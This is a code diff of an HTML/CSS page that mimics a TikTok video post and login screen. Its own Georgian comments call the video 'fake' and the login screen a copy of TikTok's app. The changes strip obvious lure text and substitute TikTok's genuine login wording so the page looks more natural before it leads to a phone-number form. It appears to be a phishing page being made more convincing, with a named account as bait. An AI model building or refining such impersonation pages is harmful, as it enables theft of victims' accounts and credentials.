@@ -45,26 +45,13 @@
   .video-player {
     flex: 1;
     position: relative;
-    /* ვითომ ვიდეოს ფოტო (შენი ვიდეოს მიხედვით) */
+    /* ვიდეოს ფოტო (გოგონა) */
     background: url('https://images.unsplash.com/photo-1598550880863-4e8aa3d0edb4?q=80&w=1000&auto=format&fit=crop') center/cover;
     display: flex;
     align-items: center;
     justify-content: center;
     cursor: pointer;
     overflow: hidden;
-  }
-
-  /* ვითომ ტექსტი ვიდეოზე */
-  .video-text {
-    position: absolute;
-    bottom: 100px;
-    width: 100%;
-    text-align: center;
-    font-size: 20px;
-    font-weight: 800;
-    text-shadow: 0 2px 4px rgba(0,0,0,0.8);
-    color: #fff;
-    letter-spacing: 1px;
   }
 
   /* Play ღილაკი */
@@ -98,7 +85,6 @@
     display: flex;
     align-items: center;
     gap: 12px;
-    margin-bottom: 10px;
   }
   .author-avatar {
     width: 48px;
@@ -114,13 +100,11 @@
   }
   .author-name span { color: #00f2ea; }
   .caption {
-    font-size: 14px;
-    color: #eee;
-    line-height: 1.4;
-    margin-bottom: 15px;
+    font-size: 12px;
+    color: #aaa;
   }
 
-  /* 2. ლოგინის ეკრანი (ზუსტად როგორც TikTok-ის აპშია) */
+  /* 2. ლოგინის ეკრანი */
   .login-screen {
     position: absolute;
     inset: 0;
@@ -159,7 +143,7 @@
   h2 { font-size: 24px; font-weight: 800; margin-bottom: 8px; text-align: center; }
   p.subtitle { color: #888; font-size: 14px; margin-bottom: 30px; text-align: center; line-height: 1.4; }
 
-  /* Open TikTok ღილაკი */
+  /* Log in ღილაკი */
   .open-tiktok-btn {
     background: #fff;
     color: #000;
@@ -265,27 +249,22 @@
         <div class="play-btn">
           <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
         </div>
-        <!-- ვიდეოს ტექსტი (შენი ვიდეოს მიხედვით) -->
-        <div class="video-text">ბანკეტი მუ????</div>
       </div>
       
       <div class="video-info">
         <div class="author">
           <div class="author-avatar"></div>
           <div>
+            <!-- მხოლოდ სახელი და TikTok -->
             <div class="author-name">nanikogamkhitashvili <span>·</span></div>
-            <div style="font-size: 12px; color: #aaa;">TikTok</div>
+            <div class="caption">TikTok</div>
           </div>
-        </div>
-        <div class="caption">
-          ვიდეოს საყურებლად გაიარეთ ავტორიზაცია 🔒
         </div>
       </div>
     </div>
 
     <!-- 2. ლოგინის ეკრანი -->
     <div class="login-screen" id="loginScreen">
-      <!-- დახურვის ღილაკი (რომ უკან დაბრუნდეს) -->
       <div class="close-btn" onclick="closeLogin()">
         <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
       </div>
@@ -298,15 +277,15 @@
         </svg>
       </div>
       
-      <h2>Welcome back</h2>
-      <p class="subtitle">Log in to TikTok to watch the full video</p>
+      <!-- ჩვეულებრივი, ბუნებრივი ტექსტები -->
+      <h2>Log in to TikTok</h2>
+      <p class="subtitle">Manage your account, check notifications, comment on videos, and more.</p>
 
-      <!-- ღილაკი -->
       <button class="open-tiktok-btn" id="openTiktokBtn" onclick="showPhoneForm()">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
            <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#000"/>
         </svg>
-        Continue with TikTok
+        Log in
       </button>
 
       <!-- ნომრის ფორმა -->
